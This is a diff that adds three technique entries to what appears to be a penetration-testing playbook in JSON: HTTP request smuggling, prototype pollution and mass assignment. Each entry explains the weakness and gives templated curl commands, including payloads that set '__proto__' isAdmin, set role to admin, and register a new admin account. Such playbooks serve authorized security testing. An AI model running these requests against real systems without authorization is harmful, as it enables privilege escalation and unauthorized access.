@@ -1560,6 +1560,145 @@
           "note": "Read Secret Manager values (base64); decode and feed into the credential loop."
         }
       ]
+    },
+    {
+      "id": "http-request-smuggling",
+      "title": "HTTP Request Smuggling (CL.TE / TE.CL)",
+      "phase": "web",
+      "hypothesis": "When a front-end proxy and a back-end server disagree about where a request ends (Content-Length vs Transfer-Encoding), you can smuggle a second request inside the first. The back-end treats your trailing bytes as the start of the next victim request, letting you poison the next response, bypass front-end access controls, or capture other users traffic. It only exists where a request passes through more than one HTTP parser.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "burp"
+      ],
+      "requires_any": [
+        "http.reachable",
+        "web.content_map"
+      ],
+      "produces": [
+        "web.authz_bypass"
+      ],
+      "priority": 40,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "a parser disagreement that lets a smuggled request reach the back-end out of band",
+      "does_not_prove": "impact until the desync is developed into a routed or captured request; a single timing blip is not a finding",
+      "report": {
+        "finding": "HTTP request smuggling (CL.TE/TE.CL desync)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://portswigger.net/web-security/request-smuggling"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -sI http://{{target}}/ | grep -iE 'Via|X-Cache|Server'",
+          "note": "A Via or cache header means a front-end sits in front of the origin: the precondition for a desync."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @clte-probe.txt http://{{target}}/",
+          "note": "A long consistent delay on the CL.TE probe (vs an instant control) confirms the desync."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s --data-binary @smuggle.txt http://{{target}}/",
+          "note": "Smuggle a prefix the back-end queues onto the next victim request; develop iteratively."
+        }
+      ]
+    },
+    {
+      "id": "prototype-pollution",
+      "title": "Prototype Pollution to Privilege / RCE",
+      "phase": "web",
+      "hypothesis": "If a Node app merges attacker-controlled keys into an object without filtering __proto__, you can set properties on the shared Object.prototype that every object then inherits. Server-side that is privilege escalation (set an isAdmin the app later reads), denial of service, or RCE where a polluted property feeds a template or child_process gadget. The tell is a JSON merge, Object.assign, or a nested query-string parser.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "requires_any": [
+        "http.reachable",
+        "web.content_map"
+      ],
+      "produces": [
+        "web.authz_bypass"
+      ],
+      "priority": 38,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "a pollutable merge where a property set via __proto__ appears on an unrelated object",
+      "does_not_prove": "impact until a gadget reads the polluted property; pollution alone is not escalation",
+      "report": {
+        "finding": "Prototype pollution via unsafe object merge",
+        "severity": "high"
+      },
+      "refs": [
+        "https://portswigger.net/web-security/prototype-pollution"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST http://{{target}}/{{endpoint}} -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+          "note": "If polluted comes back on an object that never had it, the merge pollutes the prototype. constructor.prototype is the fallback."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST http://{{target}}/{{endpoint}} -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
+          "note": "Pollute a property the app trusts for authorization, then hit a privileged route."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}/admin -b session={{cookie}}",
+          "note": "Confirm the polluted property is honoured; a template/child_process gadget turns it into RCE."
+        }
+      ]
+    },
+    {
+      "id": "mass-assignment",
+      "title": "Mass Assignment / Autobinding",
+      "phase": "web",
+      "hypothesis": "When a framework binds every field of a request body straight onto a model, you can set fields the UI never exposes. Add role, isAdmin, verified, or balance to a profile update or signup, and if the binder is not allow-listed you set a property you were never meant to control. It is a one-request privilege escalation: diff the fields the app returns against the fields it accepts, then send the privileged one back.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "requires_any": [
+        "http.reachable",
+        "web.content_map"
+      ],
+      "produces": [
+        "web.authz_bypass"
+      ],
+      "priority": 39,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "a binder that writes a privileged field the client should not control",
+      "does_not_prove": "escalation until the field is honoured, not just stored; prove which it is",
+      "report": {
+        "finding": "Mass assignment of a privileged field",
+        "severity": "high"
+      },
+      "refs": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}/api/users/me -b session={{cookie}}",
+          "note": "Every field the API returns is a candidate to write, including ones the form hides (role, isAdmin, verified)."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X PATCH http://{{target}}/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -b session={{cookie}}",
+          "note": "Add the privileged field to an update the UI never would; if it echoes back, the write stuck."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST http://{{target}}/api/register -H 'Content-Type: application/json' -d '{\"username\":\"{{user}}\",\"password\":\"{{password}}\",\"role\":\"admin\"}'",
+          "note": "The create endpoint is often less guarded than update; a fresh admin account is cleaner than escalating a watched one."
+        }
+      ]
     }
   ]
 }
